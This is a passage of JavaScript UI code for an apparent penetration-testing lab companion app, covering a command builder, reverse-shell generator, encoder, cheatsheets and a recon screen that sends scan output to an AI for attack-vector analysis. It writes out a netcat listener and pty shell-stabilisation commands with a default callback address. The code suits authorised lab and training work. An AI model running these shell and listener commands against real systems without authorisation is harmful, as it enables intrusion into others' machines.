        const n = tab?.session?.notesList?.find(n => n.id === noteId);
        if (n) { n.bookmark = false; autoSaveTab(tab); }
      } else {
        const n = (AppState.globalNotes || []).find(n => n.id === noteId);
        if (n) n.bookmark = false;
      }
      renderBookmarksScreen();
    });
  });
}

// =============================================================================
// SECTION 3R — COMMANDS SCREEN
// =============================================================================

function wireCommandsScreen() {
  // ── Tab switching — use event delegation on the tab bar ──────────────────────
  const tabBar = $('.cmd-tab-bar');
  if (tabBar && !tabBar._wired) {
    tabBar._wired = true;
    tabBar.addEventListener('click', (e) => {
      const btn = e.target.closest('.cmd-tab');
      if (!btn) return;
      $$('.cmd-tab').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const panelId = `cmd-panel-${btn.dataset.cmdTab}`;
      $$('.cmd-panel').forEach(p => p.classList.toggle('active', p.id === panelId));
    });
  }

  // ── Back button ──────────────────────────────────────────────────────────────
  const cmdBack = $('#commands-back-btn');
  if (cmdBack && !cmdBack._wired) { cmdBack._wired = true; cmdBack.addEventListener('click', () => switchScreen('dashboard')); }

  // ── Command Builder ──────────────────────────────────────────────────────────
  const cmdCatSel   = $('#cmd-tool-category-select');
  const cmdToolSel  = $('#cmd-tool-select');
  const cmdParamsEl = $('#cmd-tool-params');
  const cmdOutputEl = $('#cmd-builder-output');
  const cmdOutputWrap = $('#cmd-builder-output-wrap');

  if (cmdCatSel && !cmdCatSel._wired) {
    cmdCatSel._wired = true;
    cmdCatSel.innerHTML = '<option value="">Select category...</option>' +
      TOOL_CATEGORIES.map(cat =>
        `<option value="${escHtml(cat.id)}">${escHtml(cat.label)}</option>`
      ).join('');

    cmdCatSel.addEventListener('change', () => {
      const catId = cmdCatSel.value;
      if (!cmdToolSel) return;
      const tools = catId ? TOOLS.filter(t => t.category === catId) : [];
      cmdToolSel.innerHTML = '<option value="">Select tool...</option>' +
        tools.map(t => `<option value="${escHtml(t.id)}">${escHtml(t.label)}</option>`).join('');
      if (cmdParamsEl) cmdParamsEl.innerHTML = '';
      if (cmdOutputWrap) cmdOutputWrap.style.display = 'none';
    });
  }

  if (cmdToolSel && !cmdToolSel._wired) {
    cmdToolSel._wired = true;
    cmdToolSel.addEventListener('change', () => {
      const tool = TOOLS.find(t => t.id === cmdToolSel.value);
      if (!tool || !cmdParamsEl) { if (cmdParamsEl) cmdParamsEl.innerHTML = ''; return; }

      function renderCmdParamField(p) {
        const label = `<label class="param-label" for="cmd-param-${escHtml(p.id)}">${escHtml(p.label)}${p.required ? ' *' : ''}</label>`;
        let input = '';
        if (p.type === 'select') {
          input = `<select class="tool-select param-input" data-param="${escHtml(p.id)}" id="cmd-param-${escHtml(p.id)}">${(p.options||[]).map(o=>`<option value="${escHtml(o.value||o)}">${escHtml(o.label||o)}</option>`).join('')}</select>`;
        } else if (p.type === 'checkbox') {
          input = `<input type="checkbox" data-param="${escHtml(p.id)}" id="cmd-param-${escHtml(p.id)}" ${p.default?'checked':''}>`;
        } else if (p.type === 'textarea') {
          input = `<textarea class="param-input" data-param="${escHtml(p.id)}" id="cmd-param-${escHtml(p.id)}" placeholder="${escHtml(p.placeholder||'')}" rows="3"></textarea>`;
        } else {
          input = `<input type="text" class="param-input" data-param="${escHtml(p.id)}" id="cmd-param-${escHtml(p.id)}" placeholder="${escHtml(p.placeholder||p.default||'')}" value="${escHtml(p.default||'')}">`;
        }
        return `<div class="param-field" style="margin-bottom:6px">${label}${input}${p.hint?`<div style="font-size:10px;color:var(--text-muted);margin-top:2px">${escHtml(p.hint)}</div>`:''}</div>`;
      }

      cmdParamsEl.innerHTML = (tool.params || []).map(renderCmdParamField).join('') +
        `<button class="btn btn-primary" id="cmd-build-btn" style="width:100%;margin-top:8px">⚡ Build Command</button>`;

      // Pre-fill target from session
      const targetInput = cmdParamsEl.querySelector('[data-param="target"]');
      if (targetInput) {
        const tab = getActiveTab();
        const ip = tab?.session?.targetIp;
        if (ip && !targetInput.value) targetInput.value = ip;
      }

      const buildBtn = $('#cmd-build-btn');
      if (buildBtn) {
        buildBtn.addEventListener('click', () => {
          const params = {};
          cmdParamsEl.querySelectorAll('[data-param]').forEach(el => {
            params[el.dataset.param] = el.type === 'checkbox' ? el.checked : el.value;
          });
          let cmd = tool.buildCommand ? tool.buildCommand(params) : (tool.cmd || '');
          if (!tool.buildCommand) {
            Object.entries(params).forEach(([k, v]) => {
              cmd = cmd.replace(new RegExp(`\\{${k}\\}`, 'g'), v || `{${k}}`);
            });
          }
          if (cmdOutputEl) { cmdOutputEl.textContent = cmd; if (typeof hljs !== 'undefined') hljs.highlightElement(cmdOutputEl); }
          if (cmdOutputWrap) {
            cmdOutputWrap.style.display = '';
            const copyBtn = cmdOutputWrap.querySelector('.copy-btn');
            if (copyBtn && !copyBtn._wired) {
              copyBtn._wired = true;
              copyBtn.addEventListener('click', () => copyToClipboard(cmd, copyBtn));
            }
          }
        });
      }
    });
  }

  // ── Reverse Shell ────────────────────────────────────────────────────────────
  const cmdLangSel  = $('#cmd-revshell-lang');
  const cmdIpInput  = $('#cmd-revshell-ip');
  const cmdPortInput = $('#cmd-revshell-port');
  const cmdEncSel   = $('#cmd-revshell-encoding');

  if (cmdLangSel && !cmdLangSel._wired) {
    cmdLangSel._wired = true;
    cmdLangSel.innerHTML = SHELL_LANGUAGES.map(lang =>
      `<option value="${escHtml(lang.id)}">${escHtml(lang.label)}</option>`
    ).join('');

    // Pre-fill IP hint from active session
    if (cmdIpInput) {
      const tab = getActiveTab();
      if (tab?.session?.targetIp) cmdIpInput.placeholder = tab.session.targetIp;
    }

    function generateCmdRevshell() {
      const lang   = cmdLangSel.value;
      const ip     = (cmdIpInput?.value || '').trim() || '10.10.14.1';
      const port   = (cmdPortInput?.value || '').trim() || '4444';
      const encode = cmdEncSel?.value || 'raw';
      const shell    = generateShell(lang, ip, port);
      const encoded  = encodeShell(shell, encode);
      const listener = `nc -lvnp ${port}`;
      const stable   = `python3 -c 'import pty;pty.spawn("/bin/bash")'\nexport TERM=xterm\n# Ctrl+Z, then: stty raw -echo; fg`;

      const payloadEl  = $('#cmd-revshell-payload-out');
      const listenerEl = $('#cmd-revshell-listener-out');
      const stableEl   = $('#cmd-revshell-stable-out');
      const langLabel  = $('#cmd-revshell-lang-label');
      const outputsEl  = $('#cmd-revshell-outputs');

      if (payloadEl)  { payloadEl.textContent  = encoded;  if (typeof hljs !== 'undefined') hljs.highlightElement(payloadEl); }
      if (listenerEl) { listenerEl.textContent = listener; if (typeof hljs !== 'undefined') hljs.highlightElement(listenerEl); }
      if (stableEl)   { stableEl.textContent   = stable; }
      if (langLabel)  langLabel.textContent = lang;
      if (outputsEl)  outputsEl.style.display = '';

      // Wire copy buttons (idempotent)
      const copyPayload  = $('#cmd-copy-revshell-payload');
      const copyListener = $('#cmd-copy-revshell-listener');
      const copyStable   = $('#cmd-copy-revshell-stable');
      if (copyPayload  && !copyPayload._wired)  { copyPayload._wired  = true; copyPayload.addEventListener('click',  () => copyToClipboard(encoded,  copyPayload)); }
      if (copyListener && !copyListener._wired) { copyListener._wired = true; copyListener.addEventListener('click', () => copyToClipboard(listener, copyListener)); }
      if (copyStable   && !copyStable._wired)   { copyStable._wired   = true; copyStable.addEventListener('click',  () => copyToClipboard(stable,   copyStable)); }
    }

    [cmdLangSel, cmdEncSel].forEach(el => el?.addEventListener('change', generateCmdRevshell));
  }

  // ── Encoder ──────────────────────────────────────────────────────────────────
  const cmdEncInput  = $('#cmd-encode-input');
  const cmdEncOutput = $('#cmd-encode-output');
  const cmdEncOpSel  = $('#cmd-encode-operation');
  const cmdEncRunBtn = $('#cmd-encode-run-btn');
  const cmdEncSwapBtn = $('#cmd-encode-swap-btn');

  if (cmdEncOpSel && !cmdEncOpSel._wired) {
    cmdEncOpSel._wired = true;
    const ENC_OPS = [
      { id: 'base64-encode', label: 'Base64 Encode' },
      { id: 'base64-decode', label: 'Base64 Decode' },
      { id: 'url-encode',    label: 'URL Encode' },
      { id: 'url-decode',    label: 'URL Decode' },
      { id: 'html-encode',   label: 'HTML Encode' },
      { id: 'html-decode',   label: 'HTML Decode' },
      { id: 'hex-encode',    label: 'Hex Encode' },
      { id: 'hex-decode',    label: 'Hex Decode' },
      { id: 'rot13',         label: 'ROT13' },
      { id: 'binary-encode', label: 'Text → Binary' },
      { id: 'binary-decode', label: 'Binary → Text' },
      { id: 'md5',           label: 'MD5 Hash' },
      { id: 'sha1',          label: 'SHA1 Hash' },
      { id: 'sha256',        label: 'SHA256 Hash' },
      { id: 'jwt-decode',    label: 'JWT Decode' },
    ];
    cmdEncOpSel.innerHTML = ENC_OPS.map(o => `<option value="${o.id}">${escHtml(o.label)}</option>`).join('');

    async function runCmdEncoder() {
      const input = cmdEncInput?.value || '';
      const op = cmdEncOpSel?.value;
      if (!op) return;
      try {
        const result = await applyEncoderOp(op, input);
        if (cmdEncOutput) cmdEncOutput.value = result;
      } catch (e) {
        if (cmdEncOutput) cmdEncOutput.value = `Error: ${e.message}`;
      }
    }

    if (cmdEncRunBtn && !cmdEncRunBtn._wired) { cmdEncRunBtn._wired = true; cmdEncRunBtn.addEventListener('click', runCmdEncoder); }
    if (cmdEncSwapBtn && !cmdEncSwapBtn._wired) {
      cmdEncSwapBtn._wired = true;
      cmdEncSwapBtn.addEventListener('click', () => {
        if (!cmdEncInput || !cmdEncOutput) return;
        const tmp = cmdEncInput.value;
        cmdEncInput.value = cmdEncOutput.value;
        cmdEncOutput.value = tmp;
      });
    }
  }

  // ── Cheatsheets ───────────────────────────────────────────────────────────────
  const cmdCsSelect  = $('#cmd-cheatsheet-select');
  const cmdCsContent = $('#cmd-cheatsheet-content');

  if (cmdCsSelect && typeof CHEATSHEETS !== 'undefined' && !cmdCsSelect._wired) {
    cmdCsSelect._wired = true;
    const topics = Object.keys(CHEATSHEETS);
    cmdCsSelect.innerHTML = topics.map(t =>
      `<option value="${t}">${escHtml(CHEATSHEETS[t].title || t)}</option>`
    ).join('');

    function renderCmdCheatsheet(topic) {
      if (!cmdCsContent) return;
      const sheet = CHEATSHEETS[topic];
      if (!sheet) { cmdCsContent.innerHTML = ''; return; }
      let html = `<div class="cs-title">${escHtml(sheet.title)}</div>`;
      (sheet.sections || []).forEach(section => {
        const sectionHeading = section.heading || section.title || '';
        html += `<div class="cs-section"><div class="cs-section-title">${escHtml(sectionHeading)}</div>
          ${(section.items || []).map(item => {
            const itemKey = item.flag || item.cmd || '';
            return `
            <div class="cs-item">
              <div class="cs-item-cmd"><code>${escHtml(itemKey)}</code>
                <button class="cs-copy-btn" data-cmd="${escHtml(itemKey)}" title="Copy">⧉</button>
                <button class="cs-chat-btn" data-cmd="${escHtml(itemKey)}" title="Discuss in chat">💬</button>
              </div>
              ${item.desc ? `<div class="cs-item-desc">${escHtml(item.desc)}</div>` : ''}
            </div>`;
          }).join('')}
        </div>`;
      });
      cmdCsContent.innerHTML = html;
      cmdCsContent.querySelectorAll('.cs-copy-btn').forEach(btn =>
        btn.addEventListener('click', () => copyToClipboard(btn.dataset.cmd, btn))
      );
      cmdCsContent.querySelectorAll('.cs-chat-btn').forEach(btn =>
        btn.addEventListener('click', () => {
          sendChatMessage(`Explain this command and when I should use it:\n\`\`\`bash\n${btn.dataset.cmd}\n\`\`\``);
          switchScreen('lab');
        })
      );
    }

    cmdCsSelect.addEventListener('change', () => renderCmdCheatsheet(cmdCsSelect.value));
    if (topics.length > 0) renderCmdCheatsheet(topics[0]);
  }

  // ── References ────────────────────────────────────────────────────────────────
  $$('.ref-card').forEach(card => {
    if (card._wired) return;
    card._wired = true;
    card.addEventListener('click', () => {
      const url = card.dataset.url;
      if (url && window.electronAPI?.openExternal) window.electronAPI.openExternal(url);
    });
  });
}

// =============================================================================
// SECTION 3S — RECON SCREEN
// =============================================================================

function wireReconScreen() {
  const backBtn = $('#recon-back-btn');
  if (backBtn && !backBtn._wired) {
    backBtn._wired = true;
    backBtn.addEventListener('click', () => {
      switchScreen(getActiveTab()?.session ? 'lab' : 'dashboard');
    });
  }

  const clearBtn = $('#recon-clear-btn');
  if (clearBtn && !clearBtn._wired) {
    clearBtn._wired = true;
    clearBtn.addEventListener('click', () => {
      ['#recon-ip','#recon-hostname','#recon-ports','#recon-creds','#recon-raw-output'].forEach(sel => {
        const el = $(sel); if (el) el.value = '';
      });
      const osEl = $('#recon-os'); if (osEl) osEl.selectedIndex = 0;
      const aiOut = $('#recon-ai-output');
      if (aiOut) aiOut.innerHTML = '<span class="recon-placeholder">AI analysis of your scan output will appear here. Paste your nmap / gobuster / nikto output on the left and click Analyse.</span>';
      const extracted = $('#recon-extracted-list'); if (extracted) extracted.innerHTML = '';
      const status = $('#recon-ai-status'); if (status) status.textContent = 'Paste scan output and click Analyse';
    });
  }

  const applyBtn = $('#recon-apply-btn');
  if (applyBtn && !applyBtn._wired) {
    applyBtn._wired = true;
    applyBtn.addEventListener('click', () => {
      const tab = getActiveTab();
      if (!tab?.session) { showToast('No active session — start a session first', 'warning'); return; }

      const ip       = ($('#recon-ip')?.value       || '').trim();
      const hostname = ($('#recon-hostname')?.value  || '').trim();
      const os       = $('#recon-os')?.value         || '';
      const ports    = ($('#recon-ports')?.value     || '').trim();
      const creds    = ($('#recon-creds')?.value     || '').trim();

      if (ip)       tab.session.targetIp       = ip;
      if (hostname) tab.session.targetHostname = hostname;
      if (os)       tab.session.targetOs       = os;

      if (ports) {
        tab.session.notesList = tab.session.notesList || [];
        tab.session.notesList.unshift({ id: generateId(), text: `Open ports:\n${ports}`, createdAt: Date.now(), bookmark: true });
      }
      if (creds) {
        tab.session.notesList = tab.session.notesList || [];
        tab.session.notesList.unshift({ id: generateId(), text: `Credentials:\n${creds}`, createdAt: Date.now(), bookmark: true });
      }

      autoSaveTab(tab);
      if (typeof renderSessionInfo === 'function') renderSessionInfo(tab.session);
      showToast('Recon data applied to session ✓', 'success');
      switchScreen('lab');
    });
  }

  const analyseBtn = $('#recon-analyse-btn');
  if (analyseBtn && !analyseBtn._wired) {
    analyseBtn._wired = true;
    analyseBtn.addEventListener('click', async () => {
      const raw = ($('#recon-raw-output')?.value || '').trim();
      if (!raw) { showToast('Paste scan output first', 'warning'); return; }

      const ip     = ($('#recon-ip')?.value || '').trim();
      const tab    = getActiveTab();
      const target = ip || tab?.session?.targetIp || tab?.session?.name || 'unknown target';
      const status = $('#recon-ai-status');
      const aiOut  = $('#recon-ai-output');

      if (status) status.textContent = 'Sending to AI…';
      if (aiOut)  aiOut.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:16px;text-align:center">Sending to AI…</div>';

      const prompt = `Analyse the following scan output for target: ${target}\n\nIdentify:\n- Open ports and services with version details\n- Potential attack vectors and vulnerabilities\n- Recommended enumeration next steps\n- Any CVEs or known exploits\n- Missing security controls\n\nScan output:\n\`\`\`\n${raw.slice(0, 4000)}\n\`\`\``;

      try {
        sendChatMessage(prompt);
        if (status) status.textContent = 'Sent to AI — check Chat tab';
        if (aiOut)  aiOut.innerHTML = '<div style="color:var(--success);font-size:12px;padding:16px;text-align:center">Analysis sent to AI ✓<br><span style="color:var(--text-muted)">Switch to Chat to see the response.</span></div>';
        showToast('Scan sent to AI for analysis', 'info');
      } catch (e) {
        if (status) status.textContent = 'Error sending';
        if (aiOut)  aiOut.innerHTML = `<div style="color:var(--error);font-size:12px;padding:16px">Error: ${escHtml(e.message)}</div>`;
      }
    });
  }

  const extractBtn = $('#recon-extract-btn');
  if (extractBtn && !extractBtn._wired) {
    extractBtn._wired = true;
    extractBtn.addEventListener('click', () => {
      const raw   = $('#recon-raw-output')?.value || '';
      const ports = $('#recon-ports')?.value       || '';
      const combined = raw + '\n' + ports;
      const extracted = $('#recon-extracted-list');
      if (!extracted) return;

      const findings  = [];
      const seenPorts = new Set();
      const seenIps   = new Set();
      const seenCves  = new Set();
      let m;

      // Open ports  (nmap: "22/tcp  open  ssh")
      const portRe = /(\d+)\/(tcp|udp)\s+open\s+(\S+)/gi;
      while ((m = portRe.exec(combined)) !== null) {
        const entry = `Port ${m[1]}/${m[2]} — ${m[3]}`;
        if (!seenPorts.has(entry)) { seenPorts.add(entry); findings.push({ type:'port', value:entry }); }
      }

      // IP addresses
      const ipRe = /\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/g;
      while ((m = ipRe.exec(combined)) !== null) {
        if (!seenIps.has(m[1])) { seenIps.add(m[1]); findings.push({ type:'ip', value:m[1] }); }
      }

      // Usernames
      const userRe = /(?:user(?:name)?s?|account|login)[\s:=]+([a-zA-Z0-9_\-\.@]+)/gi;
      while ((m = userRe.exec(combined)) !== null) {
        findings.push({ type:'user', value:m[1] });
      }

      // CVE IDs
      const cveRe = /CVE-\d{4}-\d{4,7}/gi;
      while ((m = cveRe.exec(combined)) !== null) {
        const cve = m[0].toUpperCase();
        if (!seenCves.has(cve)) { seenCves.add(cve); findings.push({ type:'cve', value:cve }); }
      }

      if (findings.length === 0) {
        extracted.innerHTML = '<div style="font-size:11px;color:var(--text-muted);padding:8px">No structured findings found — try pasting full nmap -sV -sC output.</div>';
        return;
      }

      const typeIcon  = { port:'🔌', ip:'🌐', user:'👤', cve:'⚠️' };
      const typeColor = { port:'var(--accent)', ip:'var(--success)', user:'var(--warning)', cve:'var(--error)' };

      extracted.innerHTML = findings.map(f => `
        <div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:var(--bg3);border-radius:4px;font-size:11px;font-family:var(--font-mono)">
          <span>${typeIcon[f.type]||'•'}</span>
          <span style="color:${typeColor[f.type]||'var(--text)'};flex:1">${escHtml(f.value)}</span>
          <button class="btn btn-ghost btn-sm" style="font-size:10px;padding:2px 6px"
            data-finding-type="${escHtml(f.type)}" data-finding-val="${escHtml(f.value)}"
            title="Save to active session findings">+ Save</button>
        </div>
      `).join('');

      extracted.querySelectorAll('[data-finding-type]').forEach(btn => {
        btn.addEventListener('click', () => {
          const tab = getActiveTab();
          if (!tab?.session) { showToast('No active session', 'warning'); return; }
          tab.session.findings = tab.session.findings || { ports:[], users:[], credentials:[], flags:[], cves:[], files:[], hashes:[], services:[] };
          const fType = btn.dataset.findingType;
          const fVal  = btn.dataset.findingVal;
          const listMap = { port:'ports', ip:'services', user:'users', cve:'cves' };
          const listKey = listMap[fType] || 'services';
          tab.session.findings[listKey] = tab.session.findings[listKey] || [];
          if (!tab.session.findings[listKey].includes(fVal)) {
            tab.session.findings[listKey].push(fVal);
            autoSaveTab(tab);
            showToast('Saved to session findings ✓', 'success');
            btn.textContent = '✓'; btn.disabled = true;
          } else {
            showToast('Already in findings', 'info');
          }
        });
      });

      showToast(`Extracted ${findings.length} finding${findings.length !== 1 ? 's' : ''}`, 'success');
    });
  }
}

function refreshReconScreen() {
  const tab = getActiveTab();
  if (!tab?.session) return;
  const ipEl       = $('#recon-ip');
  const hostnameEl = $('#recon-hostname');
  const osEl       = $('#recon-os');
  if (ipEl       && tab.session.targetIp       && !ipEl.value)       ipEl.value       = tab.session.targetIp;
  if (hostnameEl && tab.session.targetHostname && !hostnameEl.value) hostnameEl.value = tab.session.targetHostname;
  if (osEl       && tab.session.targetOs)                            osEl.value       = tab.session.targetOs;
}

// =============================================================================
// SECTION 3N — GLOBAL INIT (DOMContentLoaded)
// =============================================================================

async function init() {
  console.log('[INIT] Starting CyberLab Companion…');

  try {
    // Show splash immediately
    showSplash();
    console.log('[INIT] Splash shown');

    // Load config
    try {
      const config = await window.electronAPI.getConfig();
      if (config) Object.assign(AppState.config, config);
      console.log('[INIT] Config loaded, theme:', AppState.config.theme);
    } catch (e) {
      console.warn('[INIT] Config load failed:', e.message);
    }

    // Check API key
    try {
      AppState.apiKeyValid = await window.electronAPI.hasApiKey();
      console.log('[INIT] API key present:', AppState.apiKeyValid);
    } catch (e) {
      console.warn('[INIT] hasApiKey failed:', e.message);
    }

    // Wire IPC listeners
    wireIpcListeners();
    console.log('[INIT] IPC listeners wired');

    // Apply theme early (no flicker) — handles both legacy string and new object format
    applyTheme(AppState.config.theme || 'stealth', false);
    console.log('[INIT] Theme applied:', AppState.config.theme);

    // Wire wizard buttons — use event delegation on the wizard container
    // because .wizard-next and .wizard-back are classes, not IDs
    const wizardEl = $('#setup-wizard');
    if (wizardEl) {
      wizardEl.addEventListener('click', (e) => {
        const btn = e.target.closest('button');
        if (!btn) return;
        if (btn.classList.contains('wizard-next')) wizardNext();
        if (btn.classList.contains('wizard-back')) wizardPrev();
      });
    }
    const wizardFinishBtn = $('#wizard-finish');
    if (wizardFinishBtn) wizardFinishBtn.addEventListener('click', wizardFinish);
    const browseVaultBtn = $('#browse-vault-btn');
    if (browseVaultBtn) browseVaultBtn.addEventListener('click', wizardPickObsidian);
    const testApiBtn = $('#test-api-btn');
    if (testApiBtn) testApiBtn.addEventListener('click', wizardTestApi);
    const openAnthropicLink = $('#open-anthropic-link');
    if (openAnthropicLink) openAnthropicLink.addEventListener('click', () => {
      window.electronAPI.openExternal('https://console.anthropic.com');
    });

    // Wire tab-bar new tab button (HTML: id="new-tab-btn", class="tab-add")
    const newTabBtn = $('#new-tab-btn');
    if (newTabBtn) newTabBtn.addEventListener('click', () => showNewSessionModal());

    // After splash delay, decide: wizard or app
    await new Promise(resolve => setTimeout(resolve, 1500));
    console.log('[INIT] Splash delay done, setupComplete:', AppState.config.setupComplete);

    hideSplash(() => {
      try {
        if (!AppState.config.setupComplete) {
          console.log('[INIT] Showing setup wizard');
          showWizard();
        } else {
          console.log('[INIT] Showing app');
          showApp();
        }
      } catch (e) {
        console.error('[INIT] Error in hideSplash callback:', e);
        showInitError(e);
      }
    });

    // Wire API status dot click → settings
    const apiDot = $('#api-status-dot');
    if (apiDot) {
      apiDot.addEventListener('click', () => {
        switchScreen('settings');
        const apiKeyInput = $('#settings-apikey');
        if (apiKeyInput) apiKeyInput.focus();
      });
    }

    // Wire VPN indicator click
    const vpnIndicator = $('#vpn-indicator');
    if (vpnIndicator) {
      vpnIndicator.addEventListener('click', () => {
        const tab = getActiveTab();
        if (tab) sendChatMessage('Check my VPN connection status and advise on next steps.');
      });
    }

    // Wire chat input
    wireChatInput();

    // Wire side panels
    wireChatSidePanel();

    // Wire snippet search overlay
    wireSnippetSearchOverlay();

    // Wire snippets screen
    wireSnippetsScreen();

    // Wire sessions list button
    const sessionsListBtn = $('#sessions-list-btn');
    if (sessionsListBtn) sessionsListBtn.addEventListener('click', showSessionsModal);

    // Wire session nav
    const navSessionsBtn = $('#nav-sessions-btn');
    if (navSessionsBtn) navSessionsBtn.addEventListener('click', showSessionsModal);

    // Duration ticker — update every second for status bar, every minute for side panel
    setInterval(() => {
      const tab = getActiveTab();
      if (!tab?.session?.startTime) return;
      const dur = formatDuration(Date.now() - tab.session.startTime);
      // Legacy elapsed-display (target panel)
      const durEl = $('#elapsed-display');
      if (durEl) durEl.textContent = dur;
      // Also legacy session-duration if present
      const durEl2 = $('#session-duration');
      if (durEl2) durEl2.textContent = dur;
      // v2 status bar
      const statusEl = $('#status-elapsed');
      if (statusEl) statusEl.textContent = dur;
    }, 1000);

    // AI link handler
    document.addEventListener('click', (e) => {
      const link = e.target.closest('.ai-link');
      if (link) {
        e.preventDefault();
        const href = link.dataset.href;
        if (href && href.startsWith('http')) window.electronAPI.openExternal(href);
      }
    });

    // Update API status dot
    updateApiStatusDot(AppState.apiKeyValid);
    console.log('[INIT] Init complete');

  } catch (e) {
    console.error('[INIT] Fatal error during init:', e);
    showInitError(e);
  }
}

function showInitError(e) {
  // Show error on splash screen so user can see what went wrong
  const splash = $('#splash');
  if (splash) {
    const errDiv = document.createElement('div');
    errDiv.style.cssText = 'position:absolute;bottom:60px;left:50%;transform:translateX(-50%);background:#ff4466;color:#fff;padding:12px 24px;border-radius:8px;font-size:13px;max-width:600px;text-align:center;font-family:monospace;';
    errDiv.textContent = 'Init error: ' + (e && e.message ? e.message : String(e)) + ' — Check DevTools Console (Ctrl+Shift+I)';
    splash.style.position = 'relative';
    splash.appendChild(errDiv);
  }
}

// Boot — handles both cases: DOMContentLoaded not yet fired, or already fired
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

// =============================================================================
// END OF RENDERER PART 3
// =============================================================================

// =============================================================================
// FOOTER QUICK THEME SWITCHER
// =============================================================================
function initFooterThemeSwitcher() {
  const btn   = document.getElementById('footer-theme-btn');
  const panel = document.getElementById('footer-theme-panel');
  const label = document.getElementById('footer-theme-label');
  if (!btn || !panel) return;

  const CORE_NAMES = { stealth: 'Stealth', graphite: 'Graphite', frost: 'Frost', oled: 'OLED' };
  const PERS_NAMES = { neutral: 'Neutral', cyberpunk: 'Cyberpunk', terminal: 'Terminal', threat: 'Threat' };

  function getTheme() {
    return {
      core:        document.documentElement.getAttribute('data-core')        || 'stealth',
      personality: document.documentElement.getAttribute('data-personality') || 'neutral',
    };
  }

  function sync() {
    const t = getTheme();
    if (label) label.textContent = `${CORE_NAMES[t.core] || t.core} / ${PERS_NAMES[t.personality] || t.personality}`;
    panel.querySelectorAll('.ftp-chip[data-core]').forEach(c =>
      c.classList.toggle('active', c.dataset.core === t.core));
    panel.querySelectorAll('.ftp-chip[data-personality]').forEach(c =>
      c.classList.toggle('active', c.dataset.personality === t.personality));
  }

  btn.addEventListener('click', e => {
    e.stopPropagation();
    const isOpen = panel.style.display !== 'none';
    panel.style.display = isOpen ? 'none' : 'flex';
    if (!isOpen) sync();
  });

  document.addEventListener('click', e => {
    if (!panel.contains(e.target) && e.target !== btn) panel.style.display = 'none';
  });

  panel.querySelectorAll('.ftp-chip[data-core]').forEach(chip => {
    chip.addEventListener('click', async e => {
      e.stopPropagation();
      const t = getTheme();
      const next = { core: chip.dataset.core, personality: t.personality };
      applyTheme(next);
      AppState.config.theme = next;
      try { await window.electronAPI.saveConfig(AppState.config); } catch (_) {}
      sync();
      try { syncSettingsThemeChips(); } catch (_) {}
    });
  });

  panel.querySelectorAll('.ftp-chip[data-personality]').forEach(chip => {
    chip.addEventListener('click', async e => {
      e.stopPropagation();
      const t = getTheme();
      const next = { core: t.core, personality: chip.dataset.personality };
      applyTheme(next);
      AppState.config.theme = next;
      try { await window.electronAPI.saveConfig(AppState.config); } catch (_) {}
      sync();
      try { syncSettingsThemeChips(); } catch (_) {}
    });
  });

  sync();
}
